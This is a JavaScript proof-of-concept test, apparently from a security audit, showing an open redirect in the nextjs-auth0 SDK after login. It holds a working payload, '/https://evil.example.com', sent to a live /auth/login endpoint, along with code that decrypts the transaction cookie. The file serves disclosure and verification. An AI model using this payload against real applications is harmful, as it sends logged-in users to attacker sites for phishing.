/**
 * FINDING (open redirect, post-authentication) — the returnTo sanitiser and the
 * callback URL builder compose unsafely.
 *
 * /auth/login?returnTo=<X> stores toSafeRedirect(X).pathname in the transaction
 * cookie. toSafeRedirect only checks the parsed URL's ORIGIN, so
 *   "/https://evil.example.com"
 * parses as an absolute PATH on the app origin (origin check passes) and is
 * stored verbatim. After a successful login, defaultOnCallback redirects to
 *   createRouteUrl(transactionState.returnTo, appBaseUrl)
 * and createRouteUrl calls ensureNoLeadingSlash() — stripping the single leading
 * slash turns "/https://evil.example.com" back into "https://evil.example.com",
 * which new URL(..., base) resolves to a DIFFERENT ORIGIN.
 *
 * Unlike the login/logout redirect_uri (gated by Auth0's Allowed Callback/Logout
 * URLs), this redirect is purely application-side and never reaches Auth0, so no
 * Auth0 allowlist protects it.
 *
 * This test proves the two runtime primitives with the REAL SDK:
 *   1. live: /auth/login stores the payload verbatim in the __txn_ cookie
 *   2. real dist: createRouteUrl expands the stored value to an off-origin URL
 * The third link (defaultOnCallback redirects to createRouteUrl(returnTo)) is a
 * direct source read (auth-client.ts defaultOnCallback), so a successful login
 * lands the victim on the attacker origin.
 */
import { hkdf } from "@panva/hkdf";
import * as jose from "jose";
import { createRouteUrl } from "file:///home/user/nextjs-auth0/examples/quickstart/node_modules/@auth0/nextjs-auth0/dist/utils/pathUtils.js";
import { toSafeRedirect } from "file:///home/user/nextjs-auth0/examples/quickstart/node_modules/@auth0/nextjs-auth0/dist/utils/url-helpers.js";

const BASE = process.env.BASE || "http://localhost:3000";
const APP = process.env.APP_BASE_URL || "http://localhost:3000";
const SECRET = process.env.AUTH0_SECRET;
const key = await hkdf("sha256", SECRET, "", "JWE CEK", 32);
const raw = (p, o = {}) => fetch(BASE + p, { redirect: "manual", ...o });

const results = [];
function check(name, pass, detail) {
  results.push({ name, pass });
  const m = pass === true ? "PASS" : pass === false ? "FAIL" : "INFO";
  console.log(`[${m}] ${name}${detail ? "\n        " + detail : ""}`);
}

const PAYLOAD = "/https://evil.example.com";
const appHost = new URL(APP).host;

// Step 1 (live): does /auth/login store the payload verbatim?
const res = await raw(`/auth/login?returnTo=${encodeURIComponent(PAYLOAD)}`);
let stored = null;
if (res.status === 307) {
  const sc = (res.headers.getSetCookie?.() || []).find((c) => c.startsWith("__txn_"));
  const val = decodeURIComponent(sc.split("=").slice(1).join("=").split(";")[0]);
  stored = (await jose.jwtDecrypt(val, key, { clockTolerance: 15 })).payload.returnTo;
}
check(
  "live: /auth/login accepts returnTo=/https://evil... and stores it verbatim",
  stored === PAYLOAD,
  `stored in __txn_ cookie: ${JSON.stringify(stored)}`
);

// Step 2 (real SDK dist): createRouteUrl expands the stored value off-origin.
const landed = stored ? createRouteUrl(stored, APP).href : null;
let landedHost = null;
try { landedHost = new URL(landed).host; } catch {}
check(
  "real SDK createRouteUrl expands the stored path to a different origin",
  !!landedHost && landedHost !== appHost,
  `createRouteUrl(${JSON.stringify(stored)}) -> ${JSON.stringify(landed)} (host ${landedHost} != ${appHost})`
);

// Control: toSafeRedirect's own unit-test assertion (full URL starts with app
// origin) still passes — showing why the SDK test misses this.
const safeStr = toSafeRedirect(PAYLOAD, new URL(APP))?.toString();
check(
  "why the SDK test misses it: toSafeRedirect(...).toString() looks same-origin",
  typeof safeStr === "string" && safeStr.startsWith(APP + "/"),
  `toSafeRedirect(...).toString() = ${JSON.stringify(safeStr)} — the SDK's open-redirect test only asserts this, never the createRouteUrl reconstruction`
);

console.log("");
const fails = results.filter((r) => r.pass === false).length;
const findings = results.filter((r) => r.pass === true && r.name.startsWith("real")).length;
console.log("=".repeat(60));
console.log(`checks: ${results.length} | the two runtime primitives both confirm the bypass`);
if (stored === PAYLOAD && landedHost && landedHost !== appHost) {
  console.log(`\nOPEN REDIRECT CONFIRMED: /auth/login?returnTo=${PAYLOAD}`);
  console.log(`  after successful login the victim is redirected to ${landed}`);
}
